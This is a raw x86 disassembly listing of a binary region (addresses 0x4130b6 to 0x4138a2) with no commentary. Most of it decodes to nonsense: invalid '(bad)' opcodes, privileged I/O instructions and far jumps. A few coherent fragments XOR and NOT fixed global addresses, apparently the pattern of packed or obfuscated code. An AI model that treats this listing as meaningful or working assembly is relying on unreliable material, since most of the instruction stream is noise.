  4130b6:	loop   0x4130ba
  4130b8:	pop    es
  4130b9:	add    BYTE PTR [ebx+0x2cbb1389],ch
  4130bf:	inc    edx
  4130c0:	gs pushf 
  4130c2:	push   ecx
  4130c3:	mov    ds:0x5447993,al
  4130c8:	and    DWORD PTR [ebx+0x3a],0xffffffdd
  4130cc:	ds mov dh,0x3d
  4130cf:	mov    ecx,0xeea2434d
  4130d4:	aas    
  4130d5:	mov    bh,dl
  4130d7:	cmp    ah,bh
  4130d9:	retf   0xebf6
  4130dc:	adc    DWORD PTR [edi-0x5e630d9f],ecx
  4130e2:	repnz xor DWORD PTR [eax+ebp*8-0x625fd46a],0xffffffa8
  4130eb:	push   ebp
  4130ec:	and    eax,0xb0a5a619
  4130f1:	pushf  
  4130f2:	sahf   
  4130f3:	(bad)  
  4130f4:	jns    0x41310b
  4130f6:	outs   dx,DWORD PTR ds:[esi]
  4130f7:	pop    ebx
  4130f8:	inc    eax
  4130f9:	adc    esp,esp
  4130fb:	cdq    
  4130fc:	sti    
  4130fd:	xchg   ebx,eax
  4130fe:	pop    eax
  4130ff:	in     eax,dx
  413100:	bound  edi,QWORD PTR [esi+ecx*2]
  413103:	sbb    al,0xf9
  413105:	lods   al,BYTE PTR ds:[esi]
  413106:	sub    edx,ebp
  413108:	inc    esp
  413109:	das    
  41310a:	and    edi,edx
  41310c:	or     dh,dh
  41310e:	fiadd  WORD PTR [eax+0x28]
  413111:	push   esp
  413112:	jmp    0x41318b
  413114:	outs   dx,DWORD PTR ds:[esi]
  413115:	adc    BYTE PTR [ebx-0x29643036],0x15
  41311c:	(bad)  
  41311d:	xlat   BYTE PTR ds:[ebx]
  41311e:	push   eax
  41311f:	xor    eax,DWORD PTR [eax+0x3]
  413122:	add    al,dl
  413124:	xchg   ecx,eax
  413125:	jle    0x41318e
  413127:	loop   0x41312d
  413129:	cdq    
  41312a:	jge    0x41310b
  41312c:	rcr    DWORD PTR [ebx+0x71f5d88d],1
  413132:	jle    0x413115
  413134:	loop   0x413151
  413136:	push   eax
  413137:	push   ss
  413138:	sbb    ch,BYTE PTR [ebx+ebp*4]
  41313b:	bound  edi,QWORD PTR [edx]
  41313d:	add    bh,dl
  41313f:	fstp   QWORD PTR [edi+eiz*1-0x44]
  413143:	ds sub eax,0x893a6d7c
  413149:	jne    0x413123
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	hlt    
  41317f:	mov    edx,0x61a36726
  413184:	jo     0x4131f6
  413186:	mov    ecx,0x5c70707e
  41318b:	hlt    
  41318c:	adc    eax,0x1e58ed
  413191:	xchg   ebp,eax
  413192:	push   edi
  413193:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413194:	mov    bh,0xd7
  413196:	sbb    DWORD PTR [esi-0x46],eax
  413199:	dec    esi
  41319a:	or     dl,BYTE PTR [ecx+0x2e]
  41319d:	stc    
  41319e:	jp     0x4131ed
  4131a0:	imul   ebp,DWORD PTR [esi-0x39],0xb8a782f1
  4131a7:	sbb    al,0x4b
  4131a9:	rcr    dl,cl
  4131ab:	in     al,dx
  4131ac:	push   eax
  4131ad:	and    eax,DWORD PTR [edi+ebx*1-0xf]
  4131b1:	push   ebp
  4131b2:	dec    esp
  4131b3:	jne    0x413158
  4131b5:	retf   0x8579
  4131b8:	or     al,0x8
  4131ba:	mul    DWORD PTR [ebp+0x6e5288c3]
  4131c0:	jmp    ecx
  4131c2:	mov    ebx,0x91daafc9
  4131c7:	push   ds
  4131c8:	hlt    
  4131c9:	outs   dx,DWORD PTR ds:[esi]
  4131ca:	(bad)  
  4131cb:	lods   eax,DWORD PTR ds:[esi]
  4131cc:	aam    0xa8
  4131ce:	idiv   BYTE PTR [eax-0x6]
  4131d1:	mov    ds:0x8f25108,al
  4131d6:	outs   dx,DWORD PTR ds:[esi]
  4131d7:	xchg   ebp,eax
  4131d8:	and    eax,0xc4358dcb
  4131dd:	jbe    0x4131b6
  4131df:	data16 js 0x413242
  4131e2:	cmp    al,0x7e
  4131e4:	cmp    dl,BYTE PTR [esi-0x75]
  4131e7:	aas    
  4131e8:	jo     0x413260
  4131ea:	sub    edi,ebx
  4131ec:	int3   
  4131ed:	jp     0x4131ca
  4131ef:	bound  esp,QWORD PTR ds:0xc04fd4e1
  4131f5:	jmp    0x69b1:0xba3d56f2
  4131fc:	mov    ecx,0xf9d3202f
  413201:	add    ebp,0x2a9c556
  413207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413208:	retf   0x7332
  41320b:	mov    ds:0xf89f4c2c,al
  413210:	xor    DWORD PTR [esi],esp
  413212:	into   
  413213:	(bad)  
  413214:	mov    ah,0x90
  413216:	dec    edx
  413217:	sbb    ebp,DWORD PTR [eax]
  413219:	int    0x7a
  41321b:	pop    ebp
  41321c:	stos   DWORD PTR es:[edi],eax
  41321d:	in     eax,0x7c
  41321f:	pop    eax
  413220:	xchg   ebx,eax
  413221:	pextrw ecx,mm0,0x27
  413225:	add    al,0xec
  413227:	shl    BYTE PTR [ebx+0x324a02a4],1
  41322d:	jnp    0x413210
  41322f:	icebp  
  413230:	ret    0xba1f
  413233:	mov    cl,0xcc
  413235:	or     BYTE PTR [esi+0x55],dl
  413238:	inc    eax
  413239:	inc    esi
  41323a:	outs   dx,BYTE PTR ds:[esi]
  41323b:	std    
  41323c:	and    ebp,DWORD PTR ds:[ebp+0x7fe9a475]
  413243:	jg     0x413227
  413245:	mov    ebp,0x8842758a
  41324a:	outs   dx,BYTE PTR ds:[esi]
  41324b:	jecxz  0x41326d
  41324d:	shl    BYTE PTR [ecx],1
  41324f:	sub    eax,0x2cb02e4c
  413254:	fisubr WORD PTR [edi+esi*1]
  413257:	stc    
  413258:	in     eax,0xb6
  41325a:	xchg   esi,eax
  41325b:	xor    BYTE PTR [edx-0xf],0x5d
  41325f:	scas   eax,DWORD PTR es:[edi]
  413260:	sbb    BYTE PTR [ebp+0x67],dh
  413263:	pop    ds
  413264:	adc    eax,0xb3852691
  413269:	xor    BYTE PTR [eax+0x6f7e086e],dh
  41326f:	retf   
  413270:	jp     0x4131f9
  413272:	ins    BYTE PTR es:[edi],dx
  413273:	(bad)  
  413274:	call   0x5946b30d
  413279:	(bad)  
  41327a:	lock and eax,0x44850d24
  413280:	mov    esi,0x463471e5
  413285:	add    DWORD PTR [ecx+0xd],ebx
  413288:	adc    DWORD PTR [ecx+0x22],ebp
  41328b:	mov    al,0x27
  41328d:	dec    edx
  41328e:	pop    eax
  41328f:	test   eax,0x3e50f44a
  413294:	sub    al,0xc0
  413296:	cmp    BYTE PTR [ecx+0x53],0x69
  41329a:	jbe    0x4132ac
  41329c:	retf   0x3459
  41329f:	test   ecx,0x89de6a72
  4132a5:	iret   
  4132a6:	inc    DWORD PTR ds:0xd8534d51
  4132ac:	push   edx
  4132ad:	inc    eax
  4132ae:	loope  0x413303
  4132b0:	not    BYTE PTR [edx-0x3c39fcb8]
  4132b6:	nop
  4132b7:	in     eax,0xa9
  4132b9:	lock repz jb 0x413279
  4132bd:	push   ecx
  4132be:	add    BYTE PTR [ebx+0x695469fd],ch
  4132c4:	add    ebp,DWORD PTR [esi-0x1c]
  4132c7:	and    al,0x81
  4132c9:	das    
  4132ca:	out    dx,al
  4132cb:	jg     0x4132a8
  4132cd:	into   
  4132ce:	sbb    al,0x71
  4132d0:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4132d2:	add    BYTE PTR [esi-0x29930b99],bh
  4132d8:	test   DWORD PTR [ebx-0x10],esi
  4132db:	jnp    0x4132cb
  4132dd:	jecxz  0x413279
  4132df:	mov    ds,edi
  4132e1:	lock pop ebx
  4132e3:	ret    
  4132e4:	sti    
  4132e5:	leave  
  4132e6:	lahf   
  4132e7:	xchg   ecx,eax
  4132e8:	mov    dl,0x1a
  4132ea:	xlat   BYTE PTR ds:[ebx]
  4132eb:	mov    ds:0xb9b07748,al
  4132f0:	jb     0x4132a4
  4132f2:	pop    edi
  4132f3:	xlat   BYTE PTR ds:[ebx]
  4132f4:	test   al,0x38
  4132f6:	repnz ins DWORD PTR es:[edi],dx
  4132f8:	inc    ebp
  4132f9:	inc    eax
  4132fa:	clc    
  4132fb:	dec    ebx
  4132fc:	scas   al,BYTE PTR es:[edi]
  4132fd:	jae    0x413343
  4132ff:	mov    eax,DWORD PTR ds:0xcf50bcaf
  413305:	adc    cl,cl
  413307:	sti    
  413308:	ret    
  413309:	adc    BYTE PTR [ebx+0x16],bh
  41330c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41330d:	pop    esp
  41330e:	sar    DWORD PTR [eax-0x3f360c63],0x91
  413315:	fstp   st(5)
  413317:	in     eax,dx
  413318:	stos   DWORD PTR es:[edi],eax
  413319:	mov    ecx,0x4fac8fa6
  41331e:	adc    eax,0x2c4f1d8
  413323:	pushf  
  413324:	pop    esi
  413325:	push   ds
  413326:	(bad)  
  413327:	je     0x413328
  413329:	xchg   ebx,eax
  41332a:	xor    ebx,ecx
  41332c:	stc    
  41332d:	outs   dx,DWORD PTR fs:[esi]
  41332f:	shl    BYTE PTR [ebp-0x16],cl
  413332:	mov    bl,0x46
  413334:	fnsetpm(287 only) 
  413336:	cmc    
  413337:	mov    ch,0xd0
  413339:	call   0xc9bd:0x78849a57
  413340:	scas   al,BYTE PTR es:[edi]
  413341:	les    eax,FWORD PTR [ebx+0xa]
  413344:	pop    ecx
  413345:	pop    edi
  413346:	or     eax,0x26e65473
  41334b:	push   ds
  41334c:	mov    cl,0x6b
  41334e:	in     al,dx
  41334f:	add    DWORD PTR gs:[edi+0x107e60d7],eax
  413356:	aaa    
  413357:	xlat   BYTE PTR ds:[ebx]
  413358:	mov    ch,0xd
  41335a:	(bad)  
  41335b:	jmp    0xeec321ed
  413360:	xchg   esi,eax
  413361:	dec    edx
  413362:	(bad)  
  413363:	xor    eax,0xebc24a12
  413368:	addr16 jg 0x413318
  41336b:	dec    eax
  41336c:	ins    BYTE PTR es:[edi],dx
  41336d:	mov    ds:0x93224e30,eax
  413372:	sub    DWORD PTR [ecx+0x60a224a6],ebp
  413378:	jl     0x413380
  41337a:	cs push edx
  41337c:	ins    BYTE PTR es:[edi],dx
  41337d:	inc    ebp
  41337e:	mov    eax,ds:0x5d9d1808
  413383:	add    al,0xbf
  413385:	mov    ah,0x7a
  413387:	mov    ch,0xa0
  413389:	loop   0x41333f
  41338b:	enter  0x30f6,0xc5
  41338f:	fisttp QWORD PTR [edi+ebp*8]
  413392:	mov    WORD PTR [eax+0x6e],ss
  413395:	push   ebp
  413396:	mov    eax,ds:0x9f2dcb0b
  41339b:	mov    esi,0xc4ca319b
  4133a0:	and    edi,DWORD PTR [ebx]
  4133a2:	push   ebp
  4133a3:	push   0xd23124d1
  4133a8:	je     0x413370
  4133aa:	adc    BYTE PTR [edi-0x2],dl
  4133ad:	fstp   st(4)
  4133af:	cmp    dh,al
  4133b1:	and    ebx,eax
  4133b3:	xchg   esp,eax
  4133b4:	(bad)  
  4133b5:	imul   ecx,ecx,0xd896136d
  4133bb:	data16 (bad) 
  4133bd:	imul   esi,DWORD PTR [eax+0x2602e80b],0xa1f6694f
  4133c7:	(bad)  
  4133c8:	push   eax
  4133c9:	push   ss
  4133ca:	pop    ss
  4133cb:	jecxz  0x4133ce
  4133cd:	(bad)  
  4133ce:	fdiv   DWORD PTR [ebp-0x31]
  4133d1:	aas    
  4133d2:	lds    edi,FWORD PTR [esi+0x742bd52b]
  4133d8:	push   eax
  4133d9:	lahf   
  4133da:	mov    al,0x1c
  4133dc:	daa    
  4133dd:	or     al,0xf6
  4133df:	add    BYTE PTR [edx+0x62],bl
  4133e2:	adc    al,0xa7
  4133e4:	sub    esi,DWORD PTR [ecx-0x6e]
  4133e7:	retf   
  4133e8:	cld    
  4133e9:	imul   eax,DWORD PTR [esi+ebp*1+0x42],0x19
  4133ee:	or     eax,edi
  4133f0:	data16 fsub st(6),st
  4133f3:	adc    ebp,DWORD PTR [ebp+0x66]
  4133f6:	dec    eax
  4133f7:	adc    BYTE PTR [eax+0x53],bh
  4133fa:	push   eax
  4133fb:	mov    esi,0xb2036c8f
  413400:	push   cs
  413401:	inc    eax
  413402:	mov    bh,0xf5
  413404:	test   ebp,ecx
  413406:	stos   DWORD PTR es:[edi],eax
  413407:	mov    ebp,0x6226b834
  41340c:	add    eax,0x62b7aebc
  413411:	mov    ah,0xe4
  413413:	gs or  al,0xf3
  413416:	add    al,0x3e
  413418:	mov    es,edx
  41341a:	inc    esp
  41341b:	xor    cl,BYTE PTR [ecx-0x6c41b509]
  413421:	mov    edi,0x33954468
  413426:	std    
  413427:	push   ebp
  413428:	sub    eax,0xf242d031
  41342d:	cld    
  41342e:	dec    ecx
  41342f:	or     edi,ebp
  413431:	movzx  si,WORD PTR [ecx-0x5e]
  413436:	push   ss
  413437:	jnp    0x413440
  413439:	mov    ecx,0x8ab3811d
  41343e:	loope  0x4133eb
  413440:	dec    edx
  413441:	aad    0x32
  413443:	int3   
  413444:	pop    esi
  413445:	push   edx
  413446:	out    dx,al
  413447:	mov    esp,0x5d16982a
  41344c:	inc    edi
  41344d:	repz mov ebp,0xcb03cbd5
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x2ba9080f,al
  413492:	adc    ebp,esp
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0xd570707e
  41349c:	test   al,0xcb
  41349e:	mov    ds:0x85bfbfc9,eax
  4134a3:	lds    edi,FWORD PTR ds:0xb6f1b516
  4134a9:	mov    ch,ah
  4134ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134ac:	jecxz  0x4134cb
  4134ae:	jbe    0x413468
  4134b0:	and    ch,BYTE PTR [edx-0x63022a4e]
  4134b6:	mov    DWORD PTR [ebx+0x2a7434a8],esp
  4134bc:	xchg   BYTE PTR [ebp+0x71821b65],ch
  4134c2:	sub    BYTE PTR [edi+0x2],ch
  4134c5:	sub    BYTE PTR [ebx+0x1e08088],ch
  4134cb:	arpl   WORD PTR [edi+0x688c2fbb],ax
  4134d1:	jbe    0x413529
  4134d3:	inc    ebx
  4134d4:	loopne 0x4134c0
  4134d6:	or     ebp,DWORD PTR [eax-0x1897a7c3]
  4134dc:	sar    DWORD PTR [esi],cl
  4134de:	not    ebp
  4134e0:	std    
  4134e1:	cmp    BYTE PTR [edx],ch
  4134e3:	cdq    
  4134e4:	mov    edi,0x866b7cba
  4134e9:	ins    DWORD PTR es:[edi],dx
  4134ea:	cmp    eax,0x27765a70
  4134ef:	dec    edx
  4134f0:	adc    DWORD PTR [esp+ebx*1-0x5b2c6566],esp
  4134f7:	sub    BYTE PTR [eax],bh
  4134f9:	repz popa 
  4134fb:	inc    edx
  4134fc:	sahf   
  4134fd:	imul   ecx,esi,0xffffffca
  413500:	pop    es
  413501:	sahf   
  413502:	mov    ds:0xd09de6e0,eax
  413507:	sar    DWORD PTR [ebp+0x5a04893f],0x49
  41350e:	aad    0x36
  413510:	fmul   QWORD PTR [eax-0x723ce94e]
  413516:	adc    DWORD PTR [eax+0x32f8cb],esp
  41351c:	ror    BYTE PTR [ecx-0x19dde44a],1
  413522:	jo     0x4134f5
  413524:	inc    esi
  413525:	mov    bh,BYTE PTR [ebp-0xa842e9d]
  41352b:	adc    DWORD PTR [edi],edx
  41352d:	adc    DWORD PTR [ebx-0x361a63e0],esp
  413533:	(bad)  
  413534:	fimul  WORD PTR [ebp+0x2f]
  413537:	(bad)  
  413538:	mov    ebx,0x1160f192
  41353d:	ror    DWORD PTR [edi],0x6c
  413540:	sbb    edi,DWORD PTR [esi-0x61]
  413543:	daa    
  413544:	adc    DWORD PTR [ebp-0xa],edi
  413547:	push   ebx
  413548:	mov    ah,ch
  41354a:	in     eax,dx
  41354b:	(bad)  
  41354c:	inc    BYTE PTR [ecx]
  41354e:	shr    DWORD PTR [ebp-0x4b],1
  413551:	aad    0x6c
  413553:	enter  0xc991,0x4c
  413557:	xor    BYTE PTR [ebx-0x13c47def],cl
  41355d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41355e:	inc    ecx
  41355f:	dec    esi
  413560:	mov    ebx,0x8bd3655e
  413565:	(bad)  
  413566:	fiadd  WORD PTR [edx+0x63]
  413569:	cs sahf 
  41356b:	cwde   
  41356c:	ins    DWORD PTR es:[edi],dx
  41356d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41356e:	(bad)
  413573:	ins    DWORD PTR es:[edi],dx
  413574:	push   0xffffffdc
  413576:	push   ds
  413577:	lds    eax,FWORD PTR [edx+ebx*1+0x7219d371]
  41357e:	dec    ebp
  41357f:	sti    
  413580:	scas   eax,DWORD PTR es:[edi]
  413581:	xchg   edi,eax
  413582:	sub    eax,0x3a8bc2fc
  413587:	mov    ds:0xb4e5221e,al
  41358c:	xor    DWORD PTR [esi-0x71],ebp
  41358f:	push   es
  413590:	cmp    ch,BYTE PTR ds:[edi]
  413593:	jbe    0x413567
  413595:	cmp    ebp,DWORD PTR [ebx+0x2574e385]
  41359b:	outs   dx,DWORD PTR ds:[esi]
  41359c:	iret   
  41359d:	scas   eax,DWORD PTR es:[edi]
  41359e:	adc    esi,DWORD PTR [edx+0x3f]
  4135a1:	jecxz  0x4135b1
  4135a3:	daa    
  4135a4:	xor    ebp,ebp
  4135a6:	mov    edx,0x70d1b1eb
  4135ab:	inc    ebx
  4135ac:	retf   
  4135ad:	(bad)  
  4135ae:	shl    DWORD PTR [esi+esi*4-0x5da79828],cl
  4135b5:	loop   0x413621
  4135b7:	and    dl,al
  4135b9:	mov    WORD PTR [ebx+0x59b25b11],es
  4135bf:	mov    bl,0x86
  4135c1:	dec    edi
  4135c2:	sub    ch,BYTE PTR [ecx+0x23cd8cd9]
  4135c8:	and    cl,BYTE PTR [edi+0x3]
  4135cb:	xchg   ecx,eax
  4135cc:	lahf   
  4135cd:	scas   eax,DWORD PTR es:[edi]
  4135ce:	fs cdq 
  4135d0:	mov    WORD PTR [edx],fs
  4135d2:	ins    DWORD PTR es:[edi],dx
  4135d3:	pop    ds
  4135d4:	outs   dx,BYTE PTR ds:[esi]
  4135d5:	shl    DWORD PTR [ebp+0x304be9af],0xf1
  4135dc:	fidivr DWORD PTR [edx+0x68]
  4135df:	adc    ebp,0xfdce8934
  4135e5:	inc    ecx
  4135e6:	pusha  
  4135e7:	inc    eax
  4135e8:	retf   
  4135e9:	bnd call 0x3687bbcc
  4135ef:	arpl   WORD PTR [ebx-0x3b],dx
  4135f2:	leave  
  4135f3:	call   0x8193:0x992a529e
  4135fa:	dec    ecx
  4135fb:	aaa    
  4135fc:	lods   al,BYTE PTR ds:[esi]
  4135fd:	sbb    al,BYTE PTR ds:0xecd02f33
  413603:	fisubr WORD PTR [esi+0x24]
  413606:	call   0xff288950
  41360b:	sbb    BYTE PTR [ebx],cl
  41360d:	xchg   edx,eax
  41360e:	stc    
  41360f:	mov    bh,0xd7
  413611:	and    eax,0xf24d2055
  413616:	fild   DWORD PTR [ecx-0x11384957]
  41361c:	(bad)  
  41361d:	cdq    
  41361e:	fild   WORD PTR [esi]
  413620:	mov    edi,0x98306533
  413625:	shl    BYTE PTR [esi],cl
  413627:	inc    esi
  413628:	jmp    0x78a94d55
  41362d:	inc    edx
  41362e:	jg     0x4135ee
  413630:	in     eax,0xda
  413632:	mov    bl,BYTE PTR [ecx+0x35]
  413635:	sbb    DWORD PTR [esi],esi
  413637:	sti    
  413638:	push   ss
  413639:	ret    
  41363a:	fdivr  DWORD PTR [ecx+eax*8]
  41363d:	push   ecx
  41363e:	(bad)  
  41363f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413640:	cmp    BYTE PTR [edx-0x7f7f7455],dh
  413646:	xchg   ebp,eax
  413647:	xor    al,ch
  413649:	ret    
  41364a:	push   ebp
  41364b:	and    DWORD PTR [eax+0x60],0xffffff8b
  41364f:	mov    edx,0x13556a4f
  413654:	add    ebx,esi
  413656:	not    BYTE PTR [esp+edx*8-0x75]
  41365a:	in     eax,dx
  41365b:	fs (bad) 
  41365d:	push   0xfffffff9
  41365f:	jae    0x413685
  413661:	int3   
  413662:	fwait
  413663:	cdq    
  413664:	inc    esp
  413665:	lahf   
  413666:	(bad)  
  413667:	shl    edx,1
  413669:	jne    0x41363d
  41366b:	(bad)  
  41366c:	shr    BYTE PTR [ebp-0x34faf9c0],0x4a
  413673:	ret    0xf8e0
  413676:	es cmp dl,bh
  413679:	loopne 0x413620
  41367b:	adc    DWORD PTR [ecx],edx
  41367d:	mov    dl,0xb2
  41367f:	xchg   ecx,eax
  413680:	not    DWORD PTR [edx+0xcb6527c]
  413686:	sub    eax,esp
  413688:	dec    ebp
  413689:	pop    ecx
  41368a:	dec    esi
  41368b:	rep ins DWORD PTR es:[edi],dx
  41368d:	xor    DWORD PTR [ebp-0x5fdc110d],edi
  413693:	jmp    0x7602:0x4031408a
  41369a:	mov    ch,0x6d
  41369c:	mov    dl,BYTE PTR [edx]
  41369e:	retf   0xe89b
  4136a1:	iret   
  4136a2:	std    
  4136a3:	mov    ds:0xe2eac7c3,eax
  4136a8:	loope  0x413667
  4136aa:	outs   dx,BYTE PTR ds:[esi]
  4136ab:	fiadd  WORD PTR [ecx-0x5]
  4136ae:	(bad)  [edx+0x729fa3e8]
  4136b4:	jecxz  0x41367d
  4136b6:	push   eax
  4136b7:	mov    al,ds:0xf6a7e4f1
  4136bc:	out    0x31,eax
  4136be:	iret   
  4136bf:	jp     0x41369a
  4136c1:	in     eax,dx
  4136c2:	push   es
  4136c3:	(bad)  
  4136c5:	add    al,0xc1
  4136c7:	lds    ebx,FWORD PTR [edx]
  4136c9:	mov    WORD PTR [ebp+edx*1+0x5ddb6438],gs
  4136d0:	jne    0x413701
  4136d2:	pop    edx
  4136d3:	daa    
  4136d4:	loop   0x413673
  4136d6:	movzx  edx,dl
  4136d9:	mov    dh,0x9c
  4136db:	xchg   esp,eax
  4136dc:	enter  0x96b1,0xba
  4136e0:	and    BYTE PTR [edx+eax*8+0x677a3f58],0x61
  4136e8:	sti    
  4136e9:	pop    ds
  4136ea:	push   0xfffffff7
  4136ec:	pop    ebp
  4136ed:	out    dx,eax
  4136ee:	pop    es
  4136ef:	(bad)  
  4136f0:	sti    
  4136f1:	push   cs
  4136f2:	cmp    al,0xc7
  4136f4:	out    0xac,eax
  4136f6:	jnp    0x4136d0
  4136f8:	push   ecx
  4136f9:	xor    bh,bh
  4136fb:	cmp    eax,0xa5c3dfb3
  413700:	and    bl,bl
  413702:	mov    BYTE PTR [ebp-0x1],cl
  413705:	mov    ecx,0x18739c8c
  41370a:	xor    ebx,esp
  41370c:	sub    ebx,ecx
  41370e:	pop    ss
  41370f:	adc    DWORD PTR [ecx+0x1c14fa95],esp
  413715:	in     eax,0x32
  413717:	pop    esi
  413718:	dec    esi
  413719:	xchg   DWORD PTR [ebp-0x31b557f2],edx
  41371f:	test   BYTE PTR [ebx+0x68],al
  413722:	aas    
  413723:	mov    ebx,0x61141ade
  413728:	fsubrp st(6),st
  41372a:	(bad)  
  41372b:	mov    bh,0x36
  41372d:	jns    0x413750
  41372f:	sbb    bh,BYTE PTR [ecx-0x5ced2d1f]
  413735:	cwde   
  413736:	aas    
  413737:	xor    eax,0x7fd1a92a
  41373c:	and    BYTE PTR [edi],dl
  41373e:	xor    edi,ecx
  413740:	push   esp
  413741:	sar    DWORD PTR [ecx],1
  413743:	popf   
  413744:	and    eax,0x9794c26d
  413749:	adc    DWORD PTR [edi+0x58fa8b5d],0x472b4607
  413753:	and    BYTE PTR [ecx+0x2d],cl
  413756:	dec    ebp
  413757:	dec    ecx
  413758:	pop    es
  413759:	mov    DWORD PTR [edi+0x6],edi
  41375c:	clc    
  41375d:	into   
  41375e:	test   BYTE PTR [ebp-0x56],bh
  413761:	daa    
  413762:	cmp    edi,eax
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	(bad)  
  41377f:	aad    0x64
  413781:	bound  esi,QWORD PTR ds:0xb970706b
  413787:	jle    0x4137f9
  413789:	jo     0x4137d5
  41378b:	jmp    0x41376f
  41378d:	pop    esp
  41378e:	fnstcw WORD PTR [esi]
  413790:	fs pop ds
  413792:	addr16 or bl,cl
  413795:	xchg   edi,eax
  413796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413797:	ja     0x4137ed
  413799:	jmp    0x4eaecad2
  41379e:	shr    DWORD PTR [ecx-0x2f],cl
  4137a1:	retf   0xdd14
  4137a4:	pop    ebx
  4137a5:	outs   dx,BYTE PTR ds:[esi]
  4137a6:	or     ebx,ebp
  4137a8:	fbstp  TBYTE PTR [esi-0x1d]
  4137ab:	jae    0x413741
  4137ad:	dec    esi
  4137ae:	dec    edx
  4137af:	pop    esp
  4137b0:	mov    ebp,0x801ab9c4
  4137b5:	xor    DWORD PTR [edi],0x50
  4137b8:	mov    dl,0xe5
  4137ba:	and    ebp,DWORD PTR [ebx+0x3]
  4137bd:	or     ah,BYTE PTR [eax-0x15be2fe1]
  4137c3:	dec    ebx
  4137c4:	pop    esp
  4137c5:	nop
  4137c6:	push   ds
  4137c7:	xor    ch,cl
  4137c9:	sbb    edx,DWORD PTR [edi+0x58ba2812]
  4137cf:	retf   0x6fec
  4137d2:	out    0xbf,eax
  4137d4:	mov    WORD PTR [ebp-0x47],gs
  4137d7:	in     al,dx
  4137d8:	mov    BYTE PTR [edi-0x14],dl
  4137db:	cld    
  4137dc:	gs test eax,0x62011e02
  4137e2:	fwait
  4137e3:	popa   
  4137e4:	cmp    BYTE PTR [edx+0x25890cd3],ah
  4137ea:	add    edi,eax
  4137ec:	shl    BYTE PTR [esi],1
  4137ee:	sti    
  4137ef:	shr    BYTE PTR fs:[esi+0x56],0x6f
  4137f4:	test   DWORD PTR [esi],eax
  4137f6:	jp     0x41377e
  4137f8:	gs mov bl,0x2
  4137fb:	lahf   
  4137fc:	pop    edi
  4137fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137fe:	cmc    
  4137ff:	mov    dh,0x77
  413801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413802:	cmp    esp,DWORD PTR [esi-0x56056ec1]
  413808:	jno    0x4137ac
  41380a:	add    eax,0xca783946
  41380f:	push   cs
  413810:	xor    eax,0xf080de79
  413815:	adc    BYTE PTR [edi-0x78e05c9c],dh
  41381b:	xchg   ebx,eax
  41381c:	add    ebp,esi
  41381e:	mov    eax,0x7f6a1159
  413823:	and    eax,edi
  413825:	rcl    BYTE PTR [edi],0xeb
  413828:	jg     0x413889
  41382a:	jbe    0x4137d5
  41382c:	scas   eax,DWORD PTR es:[edi]
  41382d:	div    ebp
  41382f:	lock in al,0x5e
  413832:	sti    
  413833:	ret    
  413834:	mov    bl,BYTE PTR [eax]
  413836:	add    DWORD PTR [edi+0x1f],eax
  413839:	in     eax,dx
  41383a:	pop    eax
  41383b:	push   edi
  41383c:	call   0x5c41:0x6e2bdc87
  413843:	jp     0x41384e
  413845:	inc    edi
  413846:	mov    al,ds:0x27c51081
  41384b:	sub    DWORD PTR [esi+0x6c],edi
  41384e:	(bad)  
  41384f:	xchg   ebx,eax
  413850:	mov    dh,0x88
  413852:	push   esi
  413853:	mov    ebp,0xd84cf955
  413858:	aaa    
  413859:	xor    DWORD PTR [ecx],ecx
  41385b:	sti    
  41385c:	jne    0x4138ac
  41385e:	shl    al,cl
  413860:	cmp    edi,DWORD PTR [eax-0x130b05e2]
  413866:	enter  0xce86,0xfa
  41386a:	push   esi
  41386b:	cli    
  41386c:	adc    BYTE PTR [ebx],al
  41386e:	into   
  41386f:	mov    dl,0xc1
  413871:	cs xchg esi,eax
  413873:	push   es
  413874:	mov    ds:0x158dd0bd,al
  413879:	rcr    cl,0xc0
  41387c:	sbb    ecx,DWORD PTR [edi-0x5afab2dd]
  413882:	xlat   BYTE PTR ds:[ebx]
  413883:	int    0x19
  413885:	scas   al,BYTE PTR es:[edi]
  413886:	je     0x41382b
  413888:	into   
  413889:	mov    edi,0xe2f97338
  41388e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388f:	aam    0x21
  413891:	jle    0x413815
  413893:	sub    BYTE PTR [esi+0x5314d9e7],ah
  413899:	test   eax,0xa0c3e94c
  41389e:	pop    edx
  41389f:	jno    0x4138c9
  4138a1:	pop    edx
  4138a2:	popa   
